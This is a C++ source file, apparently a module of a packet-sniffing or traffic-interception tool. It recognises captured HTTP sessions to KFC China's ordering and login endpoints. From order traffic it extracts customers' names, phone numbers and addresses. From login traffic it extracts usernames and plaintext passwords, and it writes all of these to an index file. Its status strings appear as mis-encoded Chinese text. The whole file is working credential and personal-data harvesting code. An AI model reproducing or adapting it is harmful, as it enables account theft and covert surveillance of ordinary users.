
#include "StdAfx.h"

#include "ShoppingKFC.h"


shopping::KFC::KFC(HttpSession *http_session, const string &pro_name) : Shopping(http_session, pro_name)
{
	
}

shopping::KFC::~KFC()
{
	
}

int shopping::KFC::IsKFC(HttpSession *http_session)
{
	
	if((http_session->m_Requestline.m_Host.Find("a.4008823823.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/mos2server_kfc/mas/mobile/invokeService")!=-1))
	{
		return kAndroidNewOrder;
	}
	if((http_session->m_Requestline.m_Host.Find("www.4008823823.com.cn")!=-1) && 
		(http_session->m_Requestline.m_URI.Find("/kfcios/loginValidate.action")!=-1))
	{
		return kPCWebLogin;
	}

	return 0;
}

int shopping::KFC::Process(const char *packet,int action)
{
	
	if (action == kAndroidNewOrder)
	{
		return AndroidNewOrder(packet);
	}
	if (action == kPCWebLogin)
	{
		return PCWebLogin(packet);
	}

	return 0;
}


int shopping::KFC::AndroidNewOrder(const char *packet)
{
	string src_data(packet);
	src_data = ms_->UrlDecode(src_data);
	ms_->SplitStringToMap(src_data,',',':',"\"");

	name_ = ms_->GetValueFromMapByKey("nameDescription",true);
	phone_ = ms_->GetValueFromMapByKey("phoneDescription",true);
	ms_->Replace(phone_,"\"}","");
	string home_num = ms_->GetValueFromMapByKey("housenumber");
	address_ = ms_->GetValueFromMapByKey("addressDescription",true);
	
	if ( name_.empty() || phone_.empty() || address_.empty() || home_num.empty())
	{
		return 0;
	}

	ms_->Replace(address_,"9999","");
	
	output_text_ =  
		"nick=" + name_ + "\r\n" + 
		"oid=" + phone_ + "\r\n" + 
		"msg=" + address_ + " " + home_num + "\r\n" + 
		"state=Ìá½»¶©µ¥\r\n";
	
	WriteIndexFile();
	return 1;
}

int shopping::KFC::PCWebLogin(const char *packet)
{
	string src_data(packet);	
	ms_->SplitStringToMap(src_data,'&','=');

	user_ = ms_->GetValueFromMapByKey("mobi",true);
	string password = ms_->GetValueFromMapByKey("pass");
	
	if ( user_.empty() || password.empty() )
	{
		return 0;
	}
	
	output_text_ =  
		"user=" + user_ + "\r\n" + 
		"pass=" + password +  "\r\n" + 
		"state=µÇÂ¼\r\n";
	
	WriteIndexFile();
	return 1;
}
